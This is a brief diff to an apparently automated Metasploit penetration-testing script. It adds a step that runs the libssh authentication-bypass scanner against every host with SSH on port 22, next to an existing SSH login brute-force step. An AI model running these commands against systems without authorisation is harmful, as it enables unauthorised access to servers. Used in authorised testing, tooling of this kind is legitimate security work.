@@ -301,6 +301,14 @@ services -u -p 22 -R
 run
 sleep 5
 
+echo "ssh - libssh_auth_bypass"
+echo "MSF - libssh bypass" >> /root/output/runtime.txt
+date >> /root/output/runtime.txt
+use auxiliary/scanner/ssh/libssh_auth_bypass
+services -u -p 22 -R
+run
+sleep 5
+
 echo "SSH_Login - bruteforce logins"
 echo "MSF SSH login" >> /root/output/runtime.txt
 date >> /root/output/runtime.txt
